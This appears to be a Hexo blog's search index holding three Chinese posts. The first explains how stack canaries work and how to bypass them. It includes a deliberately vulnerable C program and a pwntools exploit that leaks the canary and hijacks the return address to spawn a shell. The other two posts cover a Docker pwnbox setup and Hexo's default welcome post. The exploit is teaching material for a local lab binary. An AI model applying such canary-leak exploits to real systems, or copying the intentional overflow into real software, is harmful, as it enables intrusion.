<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Canary原理以及绕过]]></title>
    <url>%2F2019%2F05%2F31%2Fcanary%2F</url>
    <content type="text"><![CDATA[Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | canary value | +-----------------+ | 局部变量 | Low | | Address 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，canary则未修改，不为0就是发生了缓冲区溢出。 12345;异或检查canarymov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果可以溢出覆盖tls的话，就可以绕过Canary 如果canary已被修改，程序会走到 __stack_chk_fail 1234567891011121314//eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; Canary绕过泄露Canary漏洞代码： 1234567891011121314151617181920212223242526// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123; system("/bin/sh");&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void vuln() &#123; char buf[100]; for(int i=0;i&lt;2;i++)&#123; read(0, buf, 0x200); printf(buf); &#125;&#125;int main(void) &#123; init(); puts("Hello Hacker!"); vuln(); return 0;&#125; 编译为32位程序，开启Canary保护，关闭PIE： 1gcc -m32 -fstack-protector -no-pie ex2.c -o ex2 ida打开，在vuln处下断点，程序执行到这里时往栈上添加canary。 12.text:565C5280 mov eax, large gs:14h.text:565C5286 mov [ebp+var_C], eax ;ebp+var_C=FF80175C 接着到read的位置 buf的位置在FF8016F8，canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节 也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到canary的低位字节。 Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串，想要打印出canary就只有覆盖低位字节 得到Canary值后接下来就是普通的rop了 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *context.binary = &apos;ex2&apos;#context.log_level = &apos;debug&apos;io = process(&apos;./ex2&apos;)get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]io.recvuntil(&quot;Hello Hacker!\n&quot;)# leak Canarypayload = &quot;A&quot;*100io.sendline(payload)io.recvuntil(&quot;A&quot;*100)Canary = u32(io.recv(4))-0xalog.info(&quot;Canary:&quot;+hex(Canary))# Bypass Canarypayload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)io.send(payload)io.recv()io.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建环境]]></title>
    <url>%2F2019%2F05%2F30%2F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[kali配置安装docker正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 1234$ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 错误： 1aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali/n/a 具体原因是什么至今也没查到，可能是和kali版本有关系吧 解决方法：自己添加源就可以了 1deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable 安装成功后执行systemctl enable docker使docker开机自启。 再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。 run.sh: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env bash# Run superkojiman/pwnbox container in docker.# Store your .gdbinit, .radare2rc, .vimrc, etc in a ./rc directory. The contents will be copied to# /root/ in the container.ESC="\x1B["RESET=$ESC"39m"RED=$ESC"31m"GREEN=$ESC"32m"BLUE=$ESC"34m"if [[ -z $&#123;1&#125; ]]; then echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;" exit 0fictf_name=$&#123;1&#125;# Create docker container and run in the background# Add this if you need to modify anything in /proc: --privileged docker run -it \ -h $&#123;ctf_name&#125; \ -d \ -p 23946:23946 \ --security-opt seccomp:unconfined \ --name $&#123;ctf_name&#125; \ superkojiman/pwnbox# Tar config files in rc and extract it into the containerif [[ -d rc ]]; then cd rc if [[ -f rc.tar ]]; then rm -f rc.tar fi for i in .*; do if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then tar rf rc.tar $&#123;i&#125; fi done cd - &gt; /dev/null 2&gt;&amp;1 cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/ rm -f rc/rc.tarelse echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"fi# Create stop/rm script for containercat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh#!/bin/bashdocker stop $&#123;ctf_name&#125;docker rm $&#123;ctf_name&#125;rm -f $&#123;ctf_name&#125;-stop.shEOFchmod 755 $&#123;ctf_name&#125;-stop.sh# Create a workdir for this CTFdocker exec $&#123;ctf_name&#125; mkdir /root/workdocker cp linux_server $&#123;ctf_name&#125;:/root/workdocker cp linux_server64 $&#123;ctf_name&#125;:/root/work# Get a shellecho -e "$&#123;GREEN&#125; ______ $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___________ ___________ /___________ __$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___ __ \\_ | /| / /_ __ \\_ __ \\ __ \\_ |/_/$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;__ /_/ /_ |/ |/ /_ / / / /_/ / /_/ /_&gt; &lt; $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;_ .___/____/|__/ /_/ /_//_.___/\\____//_/|_| $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;/_/ by superkojiman $&#123;RESET&#125;"echo ""docker attach $&#123;ctf_name&#125; 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。 接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。 .vimrc: 123456789101112131415161718192021222324set nocompatibleset rtp+=~/.vim/plugged/set numberset t_Co=256syntax onset autoindentset smartindentset tabstop=4set shiftwidth=4"themecolorscheme molokai"YouCompleteMelet g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'let g:ycm_min_num_of_chars_for_completion=1let g:ycm_warning_symbol='&gt;*'let g:ycm_error_symbol='&gt;&gt;'call plug#begin('~/.vim/plugged')Plug 'Valloric/YouCompleteMe'call plug#end() YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 123sudo apt install build-essential cmake python3-devcd ~/.vim/plugged/YouCompleteMepython3 install.py --clang-completer 到此为止就差不多够用了]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
